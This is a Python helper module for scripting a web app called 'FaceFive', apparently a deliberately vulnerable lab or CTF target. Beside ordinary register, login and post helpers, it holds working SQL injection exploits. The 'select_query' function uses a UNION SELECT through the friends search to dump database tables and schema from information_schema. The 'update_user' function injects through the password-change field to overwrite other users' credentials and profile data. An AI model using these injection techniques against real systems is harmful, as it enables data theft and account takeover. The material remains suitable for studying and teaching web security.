# tools.py
#
# generic tools useful for all scripts

import requests

import html2text
_html2text = html2text.HTML2Text()


class FaceFiveSession:
    def __init__(self, url: str):
        self.url = url
        self.session = requests.session()

    def get(self, endpoint, *argv, **kwargs):
        return self.session.get('{}/{}'.format(self.url, endpoint), *argv, **kwargs)

    def head(self, endpoint, *argv, **kwargs):
        return self.session.head('{}/{}'.format(self.url, endpoint), *argv, **kwargs)

    def put(self, endpoint, *argv, **kwargs):
        return self.session.put('{}/{}'.format(self.url, endpoint), *argv, **kwargs)

    def delete(self, endpoint, *argv, **kwargs):
        return self.session.delete('{}/{}'.format(self.url, endpoint), *argv, **kwargs)

    def post(self, endpoint, *argv, **kwargs):
        return self.session.post('{}/{}'.format(self.url, endpoint), *argv, **kwargs)

    def reset_session(self):
        self.session = requests.session()

def reset_image(session: FaceFiveSession):
    '''
    reset the image for that url
    '''
    r = session.get('init')
    assert r.status_code == 200, 'Failed to reset the image: ' + r.reason
    return r

def register(session: FaceFiveSession, username: str, password: str):
    '''
    register a new user
    '''

    r = session.post('register', data={'username': username, 'password': password})
    assert r.status_code == 200, 'Failed to register the user: ' + r.reason
    assert 'already exists' not in r.text, 'Failed to register user {}: username taken'.format(username)
    assert 'Logout' in r.text, 'Failed to register user'
    return r

def login(session: FaceFiveSession, username: str, password: str):
    '''
    register a new user
    '''

    r = session.post('login', data={'username': username, 'password': password})
    assert r.status_code == 200, 'Failed to login: ' + r.reason
    return r


def logout(session: FaceFiveSession):
    '''
    logout from the website
    '''

    r = session.get('logout')
    assert r.status_code == 200, 'Failed to logout: ' + r.reason
    return r

def search_my_friends(session: FaceFiveSession, query: str):
    '''
    make a query to the my friends tab
    '''

    r = session.get('friends', params={'search': query})
    assert r.status_code == 200, 'Failed to search: ' + r.reason
    return r

def select_query(session: FaceFiveSession, table: str, col1: str, col2 = None, col3 = None, col4 = None, where=None):
    '''
    make a generic select
    '''

    def extract_from_html(html: str):
        col1 = html.split('width="50" height="50">')[1].split(' ')[0]
        col2 = html.split('</h4>')[0].split(': ')[-1]
        col3 = html.split('</h4> ')[1].split('</a>')[0]
        col4 = html.split('./static/photos/')[1].split(' ')[0]

        return col1, col2, col3, col4

    r = search_my_friends(session, '\' and 1=0 union select {}, 0, {}, {}, {} from {} {} -- '.format(col1, col2 or 1, col3 or 1, col4 or 1, table, 'where {}'.format(where) if where else ''))
    html = r.text.split('<!-- friend -->')[1:]

    result = list()
    for friend in html:
        c1, c2, c3, c4 = extract_from_html(friend)
        rec = [c1]
        if col2 is not None: rec.append(c2)
        if col3 is not None: rec.append(c3)
        if col4 is not None: rec.append(c4)
        result.append(tuple(rec))

    return result

def get_tables(session: FaceFiveSession):
    return select_query(session, 'information_schema.tables', 'table_name')

def get_schema(session: FaceFiveSession, tables: str):
    schema = dict()
    for table in tables:
        schema[table] = select_query(session, 'information_schema.columns', 'column_name', 'data_type', 'character_octet_length', where='table_name = \'{}\''.format(table))

    return schema

def update_user(session: FaceFiveSession, correct_password: str, username: str, password = None, about = None, name = None, photo = None):
    sqli = '\', username=\'{}\''.format(username)
    if password is not None: sqli += ', password=\'{}\''.format(password)
    if about is not None: sqli += ', about=\'{}\''.format(about)
    if name is not None: sqli += ', name=\'{}\''.format(name)
    if photo is not None: sqli += ', photo=\'{}\''.format(photo)

    assert sqli != '\', username=\'{}\''.format(username), 'Need some element to inject'
    sqli += ' where username=\'{}\' -- '.format(username)
    print(sqli)

    files = {
        'name': (None, ''),
        'currentpassword': (None, correct_password),
        'newpassword': (None, sqli),
        'about': (None, 'None'),
        'image': ('', ''),
    }
    r = session.post('update_profile', files=files)
    preety_print_html(r.text)
    assert r.status_code == 200, 'Failed to update password: ' + r.reason

    return r

def create_post(session: FaceFiveSession, content: str, postType="Public"):
    assert len(content) != 0, 'Content cannot be empty'
    print(content)

    post = {
        'content': content,
        'type': postType
    }

    r = session.post('create_post', data=post)
    preety_print_html(r.text)

    return r

def preety_print_html(html: str):
    print(_html2text.handle(html))
